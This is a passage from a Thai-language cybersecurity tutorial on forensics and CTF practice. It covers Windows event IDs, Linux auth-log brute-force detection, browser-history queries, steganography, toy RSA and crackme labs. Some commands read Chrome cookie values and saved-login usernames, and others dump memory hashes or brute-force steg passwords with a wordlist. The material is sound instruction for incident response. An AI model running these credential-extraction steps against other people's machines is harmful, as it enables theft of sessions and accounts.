pip3 install python-evtx

python3 << 'EOF'
from Evtx.Evtx import Evtx
from Evtx.Views import evtx_file_xml_view
import xml.etree.ElementTree as ET

def analyze_security_log(evtx_file):
    with Evtx(evtx_file) as log:
        for xml_str, _ in evtx_file_xml_view(log.get_file_header()):
            try:
                tree = ET.fromstring(xml_str)
                ns = {'e': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                
                event_id = tree.find('.//e:EventID', ns).text
                time_created = tree.find('.//e:TimeCreated', ns)
                time = time_created.get('SystemTime') if time_created is not None else 'N/A'
                
                # กรองเฉพาะ events ที่สนใจ
                if event_id in ['4624', '4625', '4648', '4720', '4728', '4732']:
                    print(f"EventID: {event_id} | Time: {time}")
                    
                    # ดึงข้อมูล account
                    for data in tree.findall('.//e:Data', ns):
                        name = data.get('Name', '')
                        if name in ['TargetUserName', 'IpAddress', 'LogonType', 'ProcessName']:
                            print(f"  {name}: {data.text}")
            except:
                pass

analyze_security_log('Security.evtx')
EOF

# Event ID ที่สำคัญสำหรับ Incident Response:
# 4624 - Logon success (LogonType 3=Network, 10=RemoteInteractive)
# 4625 - Logon failure
# 4634 - Logoff
# 4648 - Logon with explicit credentials (runas)
# 4663 - File access
# 4688 - Process creation
# 4698 - Scheduled task created
# 4720 - User created
# 4722 - User enabled
# 4728 - Member added to security group
# 4732 - Member added to local group
# 7045 - Service installed
# 7036 - Service state changed
```

### 9.2 Linux Log Analysis

```bash
# logs สำคัญ:
# /var/log/auth.log     - authentication
# /var/log/syslog       - system
# /var/log/kern.log     - kernel
# /var/log/apache2/     - web server
# /var/log/nginx/       - nginx
# /var/log/mysql/       - database
# ~/.bash_history       - command history
# /var/log/wtmp         - login records
# /var/log/btmp         - bad login attempts
# /var/log/lastlog      - last login

# ดู login history
last -a | head -20
lastb | head -20  # failed logins

# ดู current users
who
w

# ค้นหาในหลาย log ด้วย grep
grep -r 'Failed\|Invalid\|error' /var/log/

# Analyse auth.log
awk '/sshd.*Invalid user/{print $8, $10}' /var/log/auth.log | \
    sort | uniq -c | sort -rn | head 20

# ค้นหาการ brute force
python3 << 'EOF'
from collections import defaultdict
import re

ip_failures = defaultdict(int)
pattern = re.compile(r'Failed password .* from (\d+\.\d+\.\d+\.\d+)')

with open('/var/log/auth.log') as f:
    for line in f:
        match = pattern.search(line)
        if match:
            ip_failures[match.group(1)] += 1

print("Top brute force IPs:")
for ip, count in sorted(ip_failures.items(), key=lambda x: -x[1])[:10]:
    print(f"  {ip}: {count} failures")
EOF

# Timeline จาก logs
journalctl --since '2024-01-15 00:00:00' --until '2024-01-15 23:59:59'

# ค้นหา cron jobs ที่ถูก add
grep 'CRON\|crontab' /var/log/syslog

# ตรวจสอบ integrity ด้วย AIDE/Tripwire
aide --check  # เปรียบเทียบกับ baseline
```

### 9.3 Browser Forensics

```bash
# Chrome/Chromium
# Profile location: ~/.config/google-chrome/Default/

# History (SQLite)
sqlite3 ~/.config/google-chrome/Default/History \
    "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

# Downloads
sqlite3 ~/.config/google-chrome/Default/History \
    "SELECT datetime(start_time/1000000-11644473600,'unixepoch'), target_path, tab_url FROM downloads;"

# Cookies
sqlite3 ~/.config/google-chrome/Default/Cookies \
    "SELECT host_key, name, value, datetime(expires_utc/1000000-11644473600,'unixepoch') FROM cookies;"

# Saved passwords (encrypted, ต้องใช้ masterkey)
sqlite3 ~/.config/google-chrome/Default/Login\ Data \
    "SELECT origin_url, username_value FROM logins;"

# Firefox
# Profile: ~/.mozilla/firefox/*.default/
ls ~/.mozilla/firefox/

# History
sqlite3 ~/.mozilla/firefox/PROFILE/places.sqlite \
    "SELECT datetime(last_visit_date/1000000,'unixepoch'), url FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"

# Python script สำหรับ browser forensics
python3 << 'EOF'
import sqlite3
import os
from datetime import datetime

def chrome_history():
    chrome_path = os.path.expanduser('~/.config/google-chrome/Default/History')
    if not os.path.exists(chrome_path):
        print('Chrome not found')
        return
    
    # copy เพราะ Chrome lock ไฟล์
    import shutil
    tmp_path = '/tmp/chrome_history_copy'
    shutil.copy2(chrome_path, tmp_path)
    
    conn = sqlite3.connect(tmp_path)
    cursor = conn.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'),
               url, title, visit_count
        FROM urls 
        ORDER BY last_visit_time DESC 
        LIMIT 100
    """)
    
    print("Chrome History:")
    for row in cursor:
        print(f"  [{row[0]}] {row[1][:60]} (visits: {row[3]})")
    
    conn.close()

chrome_history()
EOF
```

---

## 10. แบบฝึกหัด CTF Lab

### Lab 1: Forensics Challenge - Hidden in Plain Sight

```bash
# สร้าง challenge file สำหรับฝึก

# Lab 1a: Image Steganography
# สร้างไฟล์ที่ซ่อน flag ด้วย steghide
echo 'CTF{st3g4n0gr4phy_m4st3r}' > /tmp/flag.txt
steghide embed -cf /usr/share/backgrounds/kali.png -sf /tmp/flag.txt \
    -p 'supersecret' -f

# ทดสอบ extract
steghide extract -sf /usr/share/backgrounds/kali.png -p 'supersecret'
cat flag.txt

# Lab 1b: Brute force steg password
stegseek /usr/share/backgrounds/kali.png /usr/share/wordlists/rockyou.txt

# Lab 2: Network Forensics
# ดาวน์โหลด capture จาก CTF
# wget http://challenge.ctf.com/capture.pcap

# วิเคราะห์
tshark -r capture.pcap -Y 'http' -T fields \
    -e http.request.method -e http.host -e http.request.uri

# ค้นหา flag ใน HTTP traffic
tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.file_data

# Lab 3: Memory Forensics
# python3 vol.py -f memory.raw windows.pstree
# python3 vol.py -f memory.raw windows.cmdline
# python3 vol.py -f memory.raw windows.hashdump
```

### Lab 2: Crypto Challenge

```python
#!/usr/bin/env python3
# lab_crypto.py - ฝึก crypto CTF

# Challenge 1: Multi-layer encoding
encoded = 'VFRMZ3hvcl9lbmNvZGluZ19pc19mdW59'

import base64, binascii

# ลอง decode ทุกชั้น
try:
    layer1 = base64.b64decode(encoded).decode()
    print(f"Layer 1 (b64): {layer1}")
except:
    layer1 = encoded

# ROT13
import codecs
try:
    layer2 = codecs.decode(layer1, 'rot_13')
    print(f"Layer 2 (rot13): {layer2}")
except:
    pass

# Challenge 2: RSA factoring (CTF-style เมื่อ n เล็ก)
# pip3 install sympy
from sympy.ntheory import factorint

n = 3233  # n = p * q
e = 17    # public exponent
c = 2790  # ciphertext

factors = factorint(n)
print(f"Factors of {n}: {factors}")

p = list(factors.keys())[0]
q = list(factors.keys())[1]
print(f"p = {p}, q = {q}")

# คำนวณ private key
phi_n = (p-1) * (q-1)

# หา d ที่ทำให้ e*d ≡ 1 (mod phi_n)
from sympy import mod_inverse
d = mod_inverse(e, phi_n)
print(f"Private key d = {d}")

# ถอดรหัส
m = pow(c, d, n)
print(f"Plaintext = {m} = '{chr(m)}'")

# Challenge 3: Hash length extension (SHA256)
# pip3 install hashpumpy
# import hashpumpy
# หา hash ที่ extend ได้
```

### Lab 3: สร้าง CTF Challenge ของตัวเอง

```bash
# สร้าง binary challenge (crackme)

cat > /tmp/crackme.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int check_password(char *input) {
    char secret[] = {0x63, 0x74, 0x66, 0x7b, 0x72, 0x33, 0x76, 0x33,
                     0x72, 0x73, 0x33, 0x5f, 0x6d, 0x65, 0x7d, 0x00};
    // "ctf{r3v3rs3_me}" as hex
    return strcmp(input, secret) == 0;
}

int main() {
    char input[100];
    printf("Enter the flag: ");
    scanf("%99s", input);
    
    if (check_password(input)) {
        printf("[+] Correct! Flag: %s\n", input);
    } else {
        printf("[-] Wrong password!\n");
    }
    return 0;
}
EOF

gcc -o /tmp/crackme /tmp/crackme.c -s  # -s = strip symbols

# วิเคราะห์ด้วย strings
strings /tmp/crackme

# ด้วย ltrace
echo 'test_password' | ltrace /tmp/crackme

# ด้วย gdb
gdb /tmp/crackme
# b check_password
# run
# x/s $rsi  # ดู argument ที่ 2 ของ strcmp

# ด้วย radare2
r2 /tmp/crackme
# aa
# afl
# pdf @main
# pdf @sym.check_password
```

### สรุป CTF Resources

```
แหล่งฝึก CTF:

┌────────────────────────────────────────────────────────────┐
│  PLATFORM            │ URL                                  │
├────────────────────────────────────────────────────────────┤
│  PicoCTF             │ picoctf.org (beginner-friendly)      │
│  HackTheBox          │ hackthebox.com                       │
│  TryHackMe           │ tryhackme.com                        │
│  CTFtime             │ ctftime.org (upcoming CTFs)          │
│  OverTheWire         │ overthewire.org/wargames              │
│  pwn.college         │ pwn.college (PWN focused)            │
│  CryptoHack          │ cryptohack.org (crypto focused)      │
│  RingZer0            │ ringzer0team.com                     │
└────────────────────────────────────────────────────────────┘

เครื่องมือสำคัญ:
  Forensics: Autopsy, Volatility, Binwalk, Foremost, ExifTool
  Network:   Wireshark, NetworkMiner, Zeek
  Stego:     Steghide, StegSeek, Zsteg, Sonic Visualizer
  Crypto:    CyberChef, Hashcat, John the Ripper
  Reverse:   Ghidra, Radare2, GDB, IDA Pro
  PWN:       pwntools, ROPgadget, checksec
  Web:       Burp Suite, FFUF, SQLmap
```

---

## สรุป

ในหัวข้อนี้เราได้เรียนรู้:

| หัวข้อ | เครื่องมือหลัก | ประยุกต์ใช้ |
|--------|---------------|------------|
| Disk Forensics | Autopsy, sleuthkit, dd | Recovery, Timeline |
| Memory Forensics | Volatility 3 | Malware, Credentials |
| Network Forensics | Wireshark, tshark | Packet Analysis |
| Steganography | Steghide, binwalk, zsteg | CTF Hidden Data |
| CTF Crypto | CyberChef, pycrypto | Encoding, Cipher |
| CTF Reverse | Ghidra, r2, GDB | Binary Analysis |
| CTF PWN | pwntools | Exploit Dev |
| Log Analysis | grep/awk, EventLog | IR, Detection |

---

**[← Part 46: Advanced Web Application Attacks](Part-46-Web-Application-Advanced.md)** | **[→ Part 48: Malware Analysis](Part-48-Malware-Analysis.md)**
